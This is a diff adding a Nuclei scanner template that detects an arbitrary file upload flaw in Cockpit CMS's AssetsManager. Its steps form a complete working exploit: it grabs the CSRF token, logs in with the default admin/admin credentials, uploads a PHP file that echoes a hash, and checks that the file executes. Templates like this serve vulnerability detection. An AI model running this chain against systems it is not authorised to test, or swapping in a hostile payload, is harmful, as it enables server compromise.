@@ -1,0 +1,104 @@
+id: cockpit-assetsmanager-file-upload
+info:
+  name: Cockpit AssetsManager Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in Cockpit CMS AssetsManager module.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  t3: "{{date_time('2006')}}"
+  t4: "{{date_time('01')}}"
+  t5: "{{date_time('02')}}"
+
+http:
+  - id: csrf-token-retrieval
+    method: GET
+    path:
+      - "{{BaseURL}}/auth/login?to=/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Authenticate Please"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: csrf
+        part: body
+        internal: true
+        regex:
+          - 'csfr\s:\s"(.*?)"'
+
+  - id: session-cookie-retrieval
+    method: POST
+    path:
+      - "{{BaseURL}}/auth/check"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "auth":{
+          "user":"admin",
+          "password":"admin"
+        },
+        "csfr":"{{csrf}}"
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        internal: true
+        regex:
+          - 'mysession=(.*?);'
+
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/assetsmanager/upload"
+    headers:
+      Cookie: "mysession={{cookie}}"
+      Content-Type: multipart/form-data; boundary=---------------------------36D28FBc36bd6feE7Fb3
+    body: |
+      -----------------------------36D28FBc36bd6feE7Fb3
+      Content-Disposition: form-data; name="files[]"; filename="{{t1}}.php"
+      Content-Type: text/php
+
+      <?php echo md5({{t1}});?>
+      -----------------------------36D28FBc36bd6feE7Fb3
+      Content-Disposition: form-data; name="folder"
+
+      -----------------------------36D28FBc36bd6feE7Fb3--
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: file
+        part: body
+        internal: true
+        regex:
+          - '/([0-9a-z_]{8,32}).php/'
+
+  - id: file-verification
+    method: GET
+    path:
+      - "{{BaseURL}}/storage/uploads/{{t3}}/{{t4}}/{{t5}}/{{file}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
